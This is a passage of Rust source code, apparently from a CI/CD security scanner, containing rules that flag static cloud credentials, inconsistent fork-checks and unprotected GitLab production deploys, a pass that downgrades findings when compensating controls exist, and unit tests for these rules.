                         platform a chokepoint for approvals, audit, and concurrency limits."
                    .into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

/// Rule: long-lived static credential in scope but the graph has no OIDC
/// identity. Advisory uplift on top of `long_lived_credential` that wires
/// the existing `Recommendation::FederateIdentity` variant — emits one Info
/// finding per static credential whose name suggests a cloud provider that
/// supports OIDC (AWS / GCP / Azure).
///
/// Heuristic: AWS / GCP / Azure tokens usually carry the provider name in
/// the variable identifier (`AWS_*`, `GCP_*`, `GCLOUD_*`, `GOOGLE_*`,
/// `AZURE_*`, `ARM_*`). When such a name appears AND no OIDC identity
/// exists in the graph, the migration to federation is the actionable
/// remediation. The recommendation enum has carried `FederateIdentity` for
/// two releases without any rule emitting it.
///
/// Severity: Info (advisory). The underlying credential is already flagged
/// at higher severity by `long_lived_credential`.
pub fn long_lived_secret_without_oidc_recommendation(graph: &AuthorityGraph) -> Vec<Finding> {
    // Skip if any OIDC identity already exists — the workflow is already on
    // a federated path; the static credential it carries is presumably a
    // legacy artifact unrelated to the OIDC integration.
    let has_oidc = graph.nodes_of_kind(NodeKind::Identity).any(|n| {
        n.metadata
            .get(META_OIDC)
            .map(|v| v == "true")
            .unwrap_or(false)
    });
    if has_oidc {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for secret in graph.nodes_of_kind(NodeKind::Secret) {
        let upper = secret.name.to_uppercase();
        let provider: Option<(&str, &str)> = if upper.starts_with("AWS_")
            || upper.contains("AWS_ACCESS_KEY")
            || upper.contains("AWS_SECRET")
        {
            Some(("AWS", "GitHub Actions OIDC + sts:AssumeRoleWithWebIdentity (id-token: write + aws-actions/configure-aws-credentials)"))
        } else if upper.starts_with("GCP_")
            || upper.starts_with("GCLOUD_")
            || upper.starts_with("GOOGLE_")
            || upper.contains("GCP_SERVICE_ACCOUNT")
            || upper.contains("GOOGLE_CREDENTIALS")
        {
            Some(("GCP", "GCP Workload Identity Federation (google-github-actions/auth with workload_identity_provider)"))
        } else if upper.starts_with("AZURE_")
            || upper.starts_with("ARM_")
            || upper.contains("AZURE_CLIENT_SECRET")
        {
            Some((
                "Azure",
                "Azure federated credential (azure/login with client-id, no client-secret)",
            ))
        } else {
            None
        };
        let Some((cloud, oidc_provider)) = provider else {
            continue;
        };
        findings.push(Finding {
            severity: Severity::Info,
            category: FindingCategory::LongLivedSecretWithoutOidcRecommendation,
            path: None,
            nodes_involved: vec![secret.id],
            message: format!(
                "Long-lived {cloud} credential '{}' is in scope and no OIDC identity exists \
                 in this workflow — {cloud} supports OIDC federation, so this credential could \
                 be replaced with a short-lived token issued at runtime",
                secret.name
            ),
            recommendation: Recommendation::FederateIdentity {
                static_secret: secret.name.clone(),
                oidc_provider: oidc_provider.into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

/// Rule: GHA workflow with multiple privileged jobs where SOME steps carry
/// the standard fork-check `if:` and OTHERS do not — intra-file
/// inconsistency in defensive posture. The org has the right instinct
/// (some jobs are guarded) but applied it unevenly. Surfaces the unguarded
/// privileged jobs by name so a reviewer can fix the gap in one PR.
///
/// Detection:
///   * `META_PLATFORM == "github-actions"`
///   * Trigger contains `pull_request` or `pull_request_target`
///   * Multiple jobs hold authority (steps with `HasAccessTo` to a Secret
///     or Identity)
///   * At least one such job's privileged steps ALL carry
///     `META_FORK_CHECK == "true"`
///   * AND at least one OTHER privileged job has NO step carrying that
///     marker
///
/// Severity: High. Severity floors at Medium when the inconsistency is
/// limited to a single unguarded job (one-off oversight) vs. multiple
/// (systemic gap).
pub fn pull_request_workflow_inconsistent_fork_check(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "github-actions") {
        return Vec::new();
    }
    let trigger = match graph.metadata.get(META_TRIGGER) {
        Some(t) => t.as_str(),
        None => return Vec::new(),
    };
    let in_pr_context = trigger.split(',').any(|t| {
        let t = t.trim();
        matches!(t, "pull_request" | "pull_request_target")
    });
    if !in_pr_context {
        return Vec::new();
    }

    // For each privileged step, record (job_name, has_fork_check). A job is
    // "guarded" iff every privileged step in it carries the marker.
    use std::collections::BTreeMap;
    let mut per_job: BTreeMap<String, (bool, bool)> = BTreeMap::new(); // job -> (any_guarded, any_unguarded)

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let holds_authority = graph.edges_from(step.id).any(|e| {
            e.kind == EdgeKind::HasAccessTo
                && graph
                    .node(e.to)
                    .map(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
                    .unwrap_or(false)
        });
        if !holds_authority {
            continue;
        }
        let job = step
            .metadata
            .get(META_JOB_NAME)
            .cloned()
            .unwrap_or_else(|| step.name.clone());
        let guarded = step
            .metadata
            .get(META_FORK_CHECK)
            .map(|v| v == "true")
            .unwrap_or(false);
        let entry = per_job.entry(job).or_insert((false, false));
        if guarded {
            entry.0 = true;
        } else {
            entry.1 = true;
        }
    }

    // Need >= 2 distinct privileged jobs; >= 1 fully-guarded job and >= 1
    // job with at least one unguarded privileged step.
    if per_job.len() < 2 {
        return Vec::new();
    }
    let fully_guarded: Vec<&String> = per_job
        .iter()
        .filter(|(_, (g, u))| *g && !*u)
        .map(|(k, _)| k)
        .collect();
    let unguarded: Vec<&String> = per_job
        .iter()
        .filter(|(_, (_, u))| *u)
        .map(|(k, _)| k)
        .collect();
    if fully_guarded.is_empty() || unguarded.is_empty() {
        return Vec::new();
    }
    let severity = if unguarded.len() >= 2 {
        Severity::High
    } else {
        Severity::Medium
    };
    let guarded_label = fully_guarded
        .iter()
        .map(|s| s.as_str())
        .collect::<Vec<_>>()
        .join(", ");
    let unguarded_label = unguarded
        .iter()
        .map(|s| s.as_str())
        .collect::<Vec<_>>()
        .join(", ");
    // ISC-21: anchor the workflow-level inconsistency finding on the
    // canonical guarded/unguarded job-name pair so a future split into
    // per-job findings keeps fingerprints stable per emission site.
    let anchor = format!("guarded=[{guarded_label}];unguarded=[{unguarded_label}]");
    vec![Finding {
        severity,
        category: FindingCategory::PullRequestWorkflowInconsistentForkCheck,
        path: None,
        nodes_involved: Vec::new(),
        message: format!(
            "PR-triggered workflow ('{trigger}') applies the standard fork-check \
             (`github.event.pull_request.head.repo.fork == false` or equivalent) on \
             privileged jobs [{guarded_label}] but NOT on [{unguarded_label}] — the \
             unguarded jobs hold authority that fork PRs can reach"
        ),
        recommendation: Recommendation::Manual {
            action: format!(
                "Add `if: github.event.pull_request.head.repo.fork == false` (or \
                 `github.event.pull_request.head.repo.full_name == github.repository`) to the \
                 privileged steps in [{unguarded_label}]. Match the pattern already used by \
                 [{guarded_label}] in the same workflow."
            ),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::with_anchor(anchor),
    }]
}

/// Rule: GitLab job with a production-named `environment:` binding has no
/// `rules:` / `only:` clause restricting it to protected branches. The job
/// runs (or attempts to run) on every pipeline trigger; if branch
/// protection is later relaxed the deploy becomes runnable from
/// unprotected branches without any code change.
///
/// Detection (per Step in a GitLab graph):
///   * `META_PLATFORM == "gitlab"`
///   * Step carries `environment_name` matching a production token
///     (`prod`, `production`, `prd`)
///   * Step does NOT carry `META_RULES_PROTECTED_ONLY`
///
/// Severity: Medium.
pub fn gitlab_deploy_job_missing_protected_branch_only(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_is_platform(graph, "gitlab") {
        return Vec::new();
    }
    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let env_name = match step.metadata.get("environment_name") {
            Some(n) => n.clone(),
            None => continue,
        };
        if !looks_like_prod_connection(&env_name) {
            continue;
        }
        let protected = step
            .metadata
            .get(META_RULES_PROTECTED_ONLY)
            .map(|v| v == "true")
            .unwrap_or(false);
        if protected {
            continue;
        }
        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GitlabDeployJobMissingProtectedBranchOnly,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "GitLab deploy job '{}' targets production environment '{}' but has no \
                 `rules:` / `only:` clause restricting it to protected branches — every MR \
                 and every push will attempt to run the deploy",
                step.name, env_name
            ),
            recommendation: Recommendation::Manual {
                action: "Add `rules: - if: '$CI_COMMIT_REF_PROTECTED == \"true\"'` to the job, \
                         or `only: [main]` for the simplest case. This survives future \
                         changes to branch-protection settings."
                    .into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }
    findings
}

// ── Compensating-control suppressions ────────────────────────
//
// These suppressions DOWNGRADE or REMOVE existing-rule findings when the
// graph carries a control that neutralises (or substantially mitigates)
// the underlying risk. Applied as a post-processing pass so each
// suppression can see both the finding and the surrounding graph state.
//
// Design intent (from the blue-team corpus defense report):
//   * downgrade > suppress: keep the finding visible at a lower severity
//     so it still surfaces in audits, but stop competing for triage time
//     with un-mitigated criticals
//   * never *delete* a finding silently — every suppression appends an
//     explanation suffix to the message describing the compensating
//     control taudit credited
//
// Suppressions implemented here:
//   1. `checkout_self_pr_exposure` downgraded when the same job has no
//      privileged steps (no Secret/Identity access and no env-gate writes).
//   2. `trigger_context_mismatch` downgraded when every privileged step
//      in the workflow carries the standard fork-check `if:`.
//   3. `over_privileged_identity` suppressed when the workflow-level
//      identity is broad but at least one job-level override narrows the
//      scope (job-level wins at runtime).
//   4. `terraform_auto_approve_in_prod` downgraded — not skipped — when an
//      `environment:` gate is present (replaces the previous early-skip
//      which discarded the finding entirely).
fn apply_compensating_controls(graph: &AuthorityGraph, findings: &mut [Finding]) {
    // Pre-compute graph-level signals once so the per-finding loop stays
    // O(N findings) rather than O(N findings × M nodes).
    let mut all_authority_steps_have_fork_check = true;
    let mut any_authority_step_seen = false;
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let holds_authority = graph.edges_from(step.id).any(|e| {
            e.kind == EdgeKind::HasAccessTo
                && graph
                    .node(e.to)
                    .map(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
                    .unwrap_or(false)
        });
        if !holds_authority {
            continue;
        }
        any_authority_step_seen = true;
        let guarded = step
            .metadata
            .get(META_FORK_CHECK)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !guarded {
            all_authority_steps_have_fork_check = false;
        }
    }
    let fork_check_universal = any_authority_step_seen && all_authority_steps_have_fork_check;

    // For Suppression 1, build per-job: does any step in the job have
    // access to a Secret/Identity OR write to the env gate?
    use std::collections::{BTreeMap, BTreeSet};
    let mut job_has_privileged_step: BTreeMap<String, bool> = BTreeMap::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let job = match step.metadata.get(META_JOB_NAME) {
            Some(j) => j.clone(),
            None => continue,
        };
        let privileged = graph.edges_from(step.id).any(|e| {
            e.kind == EdgeKind::HasAccessTo
                && graph
                    .node(e.to)
                    .map(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
                    .unwrap_or(false)
        }) || step
            .metadata
            .get(META_WRITES_ENV_GATE)
            .map(|v| v == "true")
            .unwrap_or(false);
        let entry = job_has_privileged_step.entry(job).or_insert(false);
        if privileged {
            *entry = true;
        }
    }

    // For Suppression 3 — over_privileged_identity — collect the names of
    // narrower per-job identity overrides so we can credit them when the
    // broad workflow-level identity fires.
    let job_level_narrow_overrides: BTreeSet<String> = graph
        .nodes_of_kind(NodeKind::Identity)
        .filter(|n| {
            n.name.starts_with("GITHUB_TOKEN (")
                && n.metadata
                    .get(META_IDENTITY_SCOPE)
                    .map(|s| s == "constrained")
                    .unwrap_or(false)
        })
        .map(|n| n.name.clone())
        .collect();

    // Helper for Suppression 5 — fetch a META_CONDITION (` AND `-joined chain
    // of stage / job / step `condition:` expressions) from the *firing step*
    // of a finding (first node in nodes_involved). The ADO parser stamps this
    // when any of stage/job/step carries a non-empty `condition:`. Returns
    // `None` for findings whose firing node is not a Step or whose graph
    // doesn't carry the metadata (e.g. GHA workflows — they have no
    // `condition:` analogue, so this CC silently no-ops on those graphs).
    let firing_step_condition = |finding: &Finding| -> Option<String> {
        finding
            .nodes_involved
            .first()
            .and_then(|id| graph.node(*id))
            .filter(|n| n.kind == NodeKind::Step)
            .and_then(|n| n.metadata.get(META_CONDITION).cloned())
    };

    for finding in findings.iter_mut() {
        match finding.category {
            // ── Suppression 1: checkout_self_pr_exposure
            FindingCategory::CheckoutSelfPrExposure => {
                // Identify the checkout step (first node in nodes_involved)
                // and look up its job. If the job has no privileged steps,
                // the checkout is read-only — downgrade to Info.
                let job = finding
                    .nodes_involved
                    .first()
                    .and_then(|id| graph.node(*id))
                    .and_then(|n| n.metadata.get(META_JOB_NAME).cloned());
                let job_privileged = job
                    .as_ref()
                    .and_then(|j| job_has_privileged_step.get(j).copied())
                    .unwrap_or(true); // unknown → conservative: keep High
                if !job_privileged {
                    finding.severity = Severity::Info;
                    finding.message.push_str(
                        " (downgraded: no privileged steps in same job — \
                                   checkout is read-only for lint/test/analysis)",
                    );
                }
            }
            // ── Suppression 2: trigger_context_mismatch
            FindingCategory::TriggerContextMismatch => {
                if fork_check_universal {
                    // Critical → Medium (not Info — the trigger choice itself
                    // is still risky enough to keep visible for audit).
                    finding.severity = match finding.severity {
                        Severity::Critical => Severity::Medium,
                        s => downgrade_one_step(s),
                    };
                    finding.message.push_str(
                        " (downgraded: every privileged job in this workflow carries the \
                         standard fork-check `if:` — fork PRs cannot reach the privileged steps)",
                    );
                }
            }
            // ── Suppression 3: over_privileged_identity
            FindingCategory::OverPrivilegedIdentity => {
                // Only relevant when the firing identity IS the
                // workflow-level GITHUB_TOKEN AND at least one job has its
                // own narrower override.
                let firing_node_name = finding
                    .nodes_involved
                    .first()
                    .and_then(|id| graph.node(*id))
                    .map(|n| n.name.clone());
                let is_workflow_level_token = firing_node_name.as_deref() == Some("GITHUB_TOKEN");
                if is_workflow_level_token && !job_level_narrow_overrides.is_empty() {
                    // Suppress by reducing to Info — the runtime identity
                    // any job actually uses is the narrower job-level one.
                    finding.severity = Severity::Info;
                    let mut narrower: Vec<&str> = job_level_narrow_overrides
                        .iter()
                        .map(|s| s.as_str())
                        .collect();
                    narrower.sort_unstable();
                    finding.message.push_str(&format!(
                        " (suppressed: job-level permissions narrow this scope at runtime — \
                         see {})",
                        narrower.join(", ")
                    ));
                }
            }
            // ── Suppression 4: terraform_auto_approve_in_prod
            //
            // The pre-existing rule already early-skipped
            // env-gated steps, so it never emits a finding to downgrade.
            // Downgrade is wired into the rule body itself (search for
            // `env_gated`) — kept as a no-op match arm here so future
            // contributors can find the suppression-pass alongside the
            // others.
            FindingCategory::TerraformAutoApproveInProd => { /* see rule body */ }
            // ── Suppression 5: ADO conditional gate downgrade
            //
            // ADO `condition:` on stage / job / step gates runtime execution
            // (`condition: eq(variables['Build.SourceBranch'], 'refs/heads/main')`
            // is the canonical "deploy only on main" pattern). The graph still
            // emits authority edges to those steps as if they always run, so
            // rules like `untrusted_with_authority` and `trigger_context_mismatch`
            // would otherwise fire at full severity on jobs the runtime would
            // never actually execute on a PR build.
            //
            // When the firing step carries `META_CONDITION` (stamped by the
            // ADO parser whenever any of stage/job/step declared a non-empty
            // `condition:`), credit the gate as a compensating control: the
            // pre-existing `Finding::with_compensating_control` builder
            // appends the control description, downgrades severity by one
            // tier, and records the original severity for the audit trail.
            // Same composition path other CC suppressions could share.
            //
            // Marcus's 40%-of-ADO-estate complaint: this is the suppression
            // that closes the false-positive class flagged in the deep audit
            // (Finding 10, file 02-ado-parser.md). Scoped here to
            // `UntrustedWithAuthority` — the load-bearing Critical case
            // where a conditionally-gated step would otherwise fire at full
            // severity. `TriggerContextMismatch` is already credited by
            // Suppression 2 (fork-check universal); stacking a second
            // downgrade there is intentionally NOT done — the match is
            // single-arm and the trigger-level mitigation belongs to
            // Suppression 2's signal (fork-check) which has no ADO analogue
            // today. Future work: extend Suppression 2 to also credit
            // META_CONDITION on trigger findings.
            FindingCategory::UntrustedWithAuthority => {
                if let Some(condition) = firing_step_condition(finding) {
                    let control = format!("ADO conditional gate ({condition})");
                    *finding = finding.clone().with_compensating_control(control);
                }
            }
            _ => {}
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::graph::*;

    fn source(file: &str) -> PipelineSource {
        PipelineSource {
            file: file.into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        }
    }

    #[test]
    fn unpinned_third_party_action_flagged() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(
            NodeKind::Image,
            "actions/checkout@v4",
            TrustZone::ThirdParty,
        );

        let findings = unpinned_action(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].category, FindingCategory::UnpinnedAction);
    }

    #[test]
    fn pinned_action_not_flagged() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(
            NodeKind::Image,
            "actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29",
            TrustZone::ThirdParty,
        );

        let findings = unpinned_action(&g);
        assert!(findings.is_empty());
    }

    #[test]
    fn untrusted_step_with_secret_is_critical() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "evil-action", TrustZone::Untrusted);
        let secret = g.add_node(NodeKind::Secret, "DEPLOY_KEY", TrustZone::FirstParty);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = untrusted_with_authority(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn implicit_identity_downgrades_to_info() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "AzureCLI@2", TrustZone::Untrusted);
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_IMPLICIT.into(), "true".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        let token = g.add_node_with_metadata(
            NodeKind::Identity,
            "System.AccessToken",
            TrustZone::FirstParty,
            meta,
        );
        g.add_edge(step, token, EdgeKind::HasAccessTo);

        let findings = untrusted_with_authority(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Info,
            "implicit token must be Info not Critical"
        );
        assert!(findings[0].message.contains("platform-injected"));
    }

    #[test]
    fn explicit_secret_remains_critical_despite_implicit_token() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let step = g.add_node(NodeKind::Step, "AzureCLI@2", TrustZone::Untrusted);
        // implicit token → Info
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_IMPLICIT.into(), "true".into());
        let token = g.add_node_with_metadata(
            NodeKind::Identity,
            "System.AccessToken",
            TrustZone::FirstParty,
            meta,
        );
        // explicit secret → Critical
        let secret = g.add_node(NodeKind::Secret, "ARM_CLIENT_SECRET", TrustZone::FirstParty);
        g.add_edge(step, token, EdgeKind::HasAccessTo);
        g.add_edge(step, secret, EdgeKind::HasAccessTo);

        let findings = untrusted_with_authority(&g);
        assert_eq!(findings.len(), 2);
        let info = findings
            .iter()
            .find(|f| f.severity == Severity::Info)
            .unwrap();
        let crit = findings
            .iter()
            .find(|f| f.severity == Severity::Critical)
            .unwrap();
        assert!(info.message.contains("platform-injected"));
        assert!(crit.message.contains("ARM_CLIENT_SECRET"));
    }

    #[test]
    fn artifact_crossing_untrusted_producer_firstparty_consumer_fires() {
        // Untrusted producer -> first-party consumer: should fire (poisoned artifact attack)
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let secret = g.add_node(NodeKind::Secret, "KEY", TrustZone::Untrusted);
        let build = g.add_node(NodeKind::Step, "pr-build", TrustZone::Untrusted);
        let artifact = g.add_node(NodeKind::Artifact, "dist.zip", TrustZone::Untrusted);
        let deploy = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);

        g.add_edge(build, secret, EdgeKind::HasAccessTo);
        g.add_edge(build, artifact, EdgeKind::Produces);
        g.add_edge(artifact, deploy, EdgeKind::Consumes);

        let findings = artifact_boundary_crossing(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].category,
            FindingCategory::ArtifactBoundaryCrossing
        );
    }

    #[test]
    fn artifact_crossing_no_authority_still_fires() {
        // The crossing itself is the risk; no HasAccessTo edge required to fire.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let build = g.add_node(NodeKind::Step, "pr-build", TrustZone::Untrusted);
        let artifact = g.add_node(NodeKind::Artifact, "dist.zip", TrustZone::Untrusted);
        let deploy = g.add_node(NodeKind::Step, "deploy", TrustZone::FirstParty);
        // No HasAccessTo edge on the producer — previously this caused the rule to skip.
        g.add_edge(build, artifact, EdgeKind::Produces);
        g.add_edge(artifact, deploy, EdgeKind::Consumes);
        let findings = artifact_boundary_crossing(&g);
        assert_eq!(
            findings.len(),
            1,
            "boundary crossing must fire without a producer HasAccessTo edge; got: {findings:#?}"
        );
        assert_eq!(
            findings[0].category,
            FindingCategory::ArtifactBoundaryCrossing
        );
    }

    // ── Bug regression: run_all_rules dedup ─────────────────────────────────

    #[test]
    fn run_all_rules_deduplicates_structurally_identical_findings() {
        // Regression for Bug 3: BFS can visit the same (step, secret) pair via
        // two distinct graph paths. Both visits produce a finding with identical
        // category + nodes_involved + message. run_all_rules must emit exactly
        // one copy regardless of path count.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.metadata
            .insert(META_PLATFORM.into(), "azure-devops".into());
        let secret = g.add_node(NodeKind::Secret, "MY_SECRET", TrustZone::FirstParty);
        let intermediate = g.add_node(NodeKind::Step, "middle-step", TrustZone::FirstParty);
        let sink = g.add_node(NodeKind::Step, "sink-step", TrustZone::Untrusted);

        // Two paths from secret → sink: direct and via intermediate.
        g.add_edge(sink, secret, EdgeKind::HasAccessTo);
        g.add_edge(intermediate, secret, EdgeKind::HasAccessTo);
        g.add_edge(sink, intermediate, EdgeKind::HasAccessTo);

        let findings = run_all_rules(&g, 4);

        // Count findings whose nodes_involved contain the sink step.
        let sink_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.nodes_involved.contains(&sink))
            .filter(|f| f.nodes_involved.contains(&secret))
            .collect();

        // Regardless of path count through the graph, each unique
        // (category, nodes, message) triple must appear at most once.
        let unique_messages: std::collections::HashSet<_> =
            sink_findings.iter().map(|f| &f.message).collect();
        assert_eq!(
            sink_findings.len(),
            unique_messages.len(),
            "duplicate findings must be deduplicated; got: {findings:#?}"
        );
    }

    #[test]
    fn artifact_crossing_same_job_does_not_fire() {
        // Upload and download in the same job is a legitimate temp-file pattern.
        // META_JOB_NAME guard must suppress the finding.
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let build = g.add_node_with_metadata(
            NodeKind::Step,
            "pr-build",
            TrustZone::Untrusted,
            [(META_JOB_NAME.to_string(), "build".to_string())].into(),
        );
        let artifact = g.add_node(NodeKind::Artifact, "dist.zip", TrustZone::Untrusted);
        let deploy = g.add_node_with_metadata(
            NodeKind::Step,
            "deploy",
            TrustZone::FirstParty,
            [
                (META_JOB_NAME.to_string(), "build".to_string()), // SAME job
            ]
            .into(),
        );
        g.add_edge(build, artifact, EdgeKind::Produces);
        g.add_edge(artifact, deploy, EdgeKind::Consumes);
        let findings = artifact_boundary_crossing(&g);
        assert_eq!(
            findings.len(),
            0,
            "intra-job upload→download must not fire; got: {findings:#?}"
        );
    }

    #[test]
    fn artifact_crossing_firstparty_producer_untrusted_consumer_silent() {
        // First-party producer -> untrusted consumer: should NOT fire (benign direction)
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let secret = g.add_node(NodeKind::Secret, "KEY", TrustZone::FirstParty);
        let build = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        let artifact = g.add_node(NodeKind::Artifact, "dist.zip", TrustZone::FirstParty);
        let deploy = g.add_node(NodeKind::Step, "deploy", TrustZone::Untrusted);

        g.add_edge(build, secret, EdgeKind::HasAccessTo);
        g.add_edge(build, artifact, EdgeKind::Produces);
        g.add_edge(artifact, deploy, EdgeKind::Consumes);

        let findings = artifact_boundary_crossing(&g);
        assert_eq!(
            findings.len(),
            0,
            "first-party -> untrusted should not fire"
        );
    }

    #[test]
    fn propagation_to_sha_pinned_is_high_not_critical() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(
            "digest".into(),
            "a5ac7e51b41094c92402da3b24376905380afc29".into(),
        );
        let identity = g.add_node(NodeKind::Identity, "GITHUB_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "checkout", TrustZone::ThirdParty);
        let image = g.add_node_with_metadata(
            NodeKind::Image,
            "actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29",
            TrustZone::ThirdParty,
            meta,
        );

        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = authority_propagation(&g, 4);
        // Should find propagation to the SHA-pinned image
        let image_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.nodes_involved.contains(&image))
            .collect();
        assert!(!image_findings.is_empty());
        // SHA-pinned targets get High, not Critical (non-OIDC source)
        assert_eq!(image_findings[0].severity, Severity::High);
    }

    #[test]
    fn oidc_identity_to_pinned_third_party_is_critical() {
        let mut g = AuthorityGraph::new(source("ci.yml"));

        // OIDC-federated cloud identity — token itself is the threat
        let mut id_meta = std::collections::HashMap::new();
        id_meta.insert(META_OIDC.into(), "true".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "AWS_OIDC_ROLE",
            TrustZone::FirstParty,
            id_meta,
        );

        // SHA-pinned ThirdParty image — would normally be High without OIDC
        let mut img_meta = std::collections::HashMap::new();
        img_meta.insert(
            META_DIGEST.into(),
            "a5ac7e51b41094c92402da3b24376905380afc29".into(),
        );
        let image = g.add_node_with_metadata(
            NodeKind::Image,
            "aws-actions/configure-aws-credentials@a5ac7e51b41094c92402da3b24376905380afc29",
            TrustZone::ThirdParty,
            img_meta,
        );

        // Step in ThirdParty zone holds the OIDC identity and uses the pinned image
        let step = g.add_node(
            NodeKind::Step,
            "configure-aws-credentials",
            TrustZone::ThirdParty,
        );
        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = authority_propagation(&g, 4);
        let image_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.nodes_involved.contains(&image))
            .collect();
        assert!(
            !image_findings.is_empty(),
            "expected OIDC→pinned propagation finding"
        );
        // OIDC source escalates pinned ThirdParty from High → Critical
        assert_eq!(image_findings[0].severity, Severity::Critical);
    }

    #[test]
    fn propagation_to_untrusted_is_critical() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let identity = g.add_node(NodeKind::Identity, "GITHUB_TOKEN", TrustZone::FirstParty);
        let step = g.add_node(NodeKind::Step, "deploy", TrustZone::Untrusted);
        let image = g.add_node(NodeKind::Image, "evil/action@main", TrustZone::Untrusted);

        g.add_edge(step, identity, EdgeKind::HasAccessTo);
        g.add_edge(step, image, EdgeKind::UsesImage);

        let findings = authority_propagation(&g, 4);
        let image_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.nodes_involved.contains(&image))
            .collect();
        assert!(!image_findings.is_empty());
        assert_eq!(image_findings[0].severity, Severity::Critical);
    }

    #[test]
    fn long_lived_credential_detected() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        g.add_node(NodeKind::Secret, "AWS_ACCESS_KEY_ID", TrustZone::FirstParty);
        g.add_node(NodeKind::Secret, "NPM_TOKEN", TrustZone::FirstParty);
        g.add_node(NodeKind::Secret, "DEPLOY_API_KEY", TrustZone::FirstParty);
        // Non-matching names
        g.add_node(NodeKind::Secret, "CACHE_TTL", TrustZone::FirstParty);

        let findings = long_lived_credential(&g);
        assert_eq!(findings.len(), 2); // AWS_ACCESS_KEY_ID + DEPLOY_API_KEY
        assert!(findings
            .iter()
            .all(|f| f.category == FindingCategory::LongLivedCredential));
    }

    #[test]
    fn duplicate_unpinned_actions_deduplicated() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        // Same action used in two jobs — two Image nodes, same name
        g.add_node(NodeKind::Image, "actions/checkout@v4", TrustZone::Untrusted);
        g.add_node(NodeKind::Image, "actions/checkout@v4", TrustZone::Untrusted);
        g.add_node(
            NodeKind::Image,
            "actions/setup-node@v3",
            TrustZone::Untrusted,
        );

        let findings = unpinned_action(&g);
        // Should get 2 findings (checkout + setup-node), not 3
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn broad_identity_scope_flagged_as_high() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_PERMISSIONS.into(), "write-all".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "broad".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN",
            TrustZone::FirstParty,
            meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = over_privileged_identity(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("broad"));
    }

    #[test]
    fn unknown_identity_scope_flagged_as_medium() {
        let mut g = AuthorityGraph::new(source("ci.yml"));
        let mut meta = std::collections::HashMap::new();
        meta.insert(META_PERMISSIONS.into(), "custom-scope".into());
        meta.insert(META_IDENTITY_SCOPE.into(), "unknown".into());
        let identity = g.add_node_with_metadata(
            NodeKind::Identity,
            "GITHUB_TOKEN",
            TrustZone::FirstParty,
            meta,
        );
        let step = g.add_node(NodeKind::Step, "build", TrustZone::FirstParty);
        g.add_edge(step, identity, EdgeKind::HasAccessTo);

        let findings = over_privileged_identity(&g);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].message.contains("unknown"));
    }

    #[test]
    fn floating_image_unpinned_container_flagged() {
